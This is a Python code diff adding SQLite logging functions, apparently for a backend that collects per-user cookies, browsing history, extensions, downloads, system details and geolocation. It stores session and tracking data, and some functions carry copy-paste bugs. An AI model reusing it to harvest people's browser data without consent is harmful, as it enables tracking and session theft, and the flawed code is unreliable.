@@ -236,3 +236,133 @@ def PSDBlog(data): #PrivacySettings DataBase Logger
     conn.commit()
     
     pass
+
+def Xlog(data): #Base DataBase Logger for several loggers
+    
+    conn = sql.connect(DB_PATH)
+    cur = conn.cursor()
+    Blob = data["blob"]
+    uid = data["uid"]
+
+    cur.execute("""INSERT OR IGNORE INTO PrivacySettings (Blob,uid) VALUES (?,?)""", 
+                        (Blob,uid))
+    conn.commit()
+    
+    pass
+
+def Cookieslog(data): #Base DataBase Logger for several loggers
+    
+    conn = sql.connect(DB_PATH)
+    cur = conn.cursor()
+    Blob = data["blob"]
+    uid = data["uid"]
+
+    cur.execute("""INSERT OR IGNORE INTO Cookies (cookies,uid) VALUES (?,?)""", 
+                        (Blob,uid))
+    conn.commit()
+    
+    pass
+
+def HistorialLog(data): #Base DataBase Logger for several loggers
+    
+    conn = sql.connect(DB_PATH)
+    cur = conn.cursor()
+    Blob = data["blob"]
+    uid = data["uid"]
+
+    cur.execute("""INSERT OR IGNORE INTO Historial (historie,uid) VALUES (?,?)""", 
+                        (Blob,uid))
+    conn.commit()
+    
+    pass
+
+def Proxielog(data): #Base DataBase Logger for several loggers
+    
+    conn = sql.connect(DB_PATH)
+    cur = conn.cursor()
+    Blob = data["blob"]
+    uid = data["uid"]
+
+    cur.execute("""INSERT OR IGNORE INTO Proxies (proxy,uid) VALUES (?,?)""", 
+                        (Blob,uid))
+    conn.commit()
+    
+    pass
+
+def Extensionslog(data): #Base DataBase Logger for several loggers
+    
+    conn = sql.connect(DB_PATH)
+    cur = conn.cursor()
+    Blob = data["blob"]
+    uid = data["uid"]
+
+    cur.execute("""INSERT OR IGNORE INTO PExtensions (extension,uid) VALUES (?,?)""", 
+                        (Blob,uid))
+    conn.commit()
+    
+    pass
+def Downloadslog(data): #Base DataBase Logger for several loggers
+    
+    conn = sql.connect(DB_PATH)
+    cur = conn.cursor()
+    Blob = data["blob"]
+    uid = data["uid"]
+
+    cur.execute("""INSERT OR IGNORE INTO Downloads (down,uid) VALUES (?,?)""", 
+                        (Blob,uid))
+    conn.commit()
+    
+    pass
+
+def CPUlog(data): #Base DataBase Logger for several loggers
+    
+    conn = sql.connect(DB_PATH)
+    cur = conn.cursor()
+    Blob = data["blob"]
+    uid = data["uid"]
+    
+    cur.execute("SELECT * FROM  Cpus WHERE psuid = ?", (uid,)) #https://stackoverflow.com/questions/16856647/sqlite3-programmingerror-incorrect-number-of-bindings-supplied-the-current-sta
+    rows = cur.fetchone()
+    if rows == None:
+        cur.execute("""INSERT OR IGNORE INTO Cpus (cpu,uid) VALUES (?,?)""", 
+                        (Blob,uid))
+    else:
+        cur.execute("""UPDATE Cpus SET cpu = ? WHERE uid = ?""",
+                        (Blob,uid))
+    conn.commit()
+
+    
+    pass
+
+def OSlog(data): #Base DataBase Logger for several loggers
+    
+    conn = sql.connect(DB_PATH)
+    cur = conn.cursor()
+    Blob = data["blob"]
+    uid = data["uid"]
+
+    cur.execute("SELECT * FROM  OS WHERE psuid = ?", (uid,)) #https://stackoverflow.com/questions/16856647/sqlite3-programmingerror-incorrect-number-of-bindings-supplied-the-current-sta
+    rows = cur.fetchone()
+    if rows == None:
+        cur.execute("""INSERT OR IGNORE INTO OS (os,uid) VALUES (?,?)""", 
+                        (Blob,uid))
+    else:
+        cur.execute("""UPDATE OS SET os = ? WHERE uid = ?""",
+                        (Blob,uid))
+    conn.commit()
+    
+    pass
+
+def Geolocationslog(data): #Base DataBase Logger for several loggers
+    
+    conn = sql.connect(DB_PATH)
+    cur = conn.cursor()
+    Lat = data["lat"]
+    Lon = data["lon"]
+    uid = data["uid"]
+
+    cur.execute("""INSERT OR IGNORE INTO Geolocations (latitude,longitude,uid) VALUES (?,?)""", 
+                        (Lat,Lon,uid))
+    conn.commit()
+    
+    pass
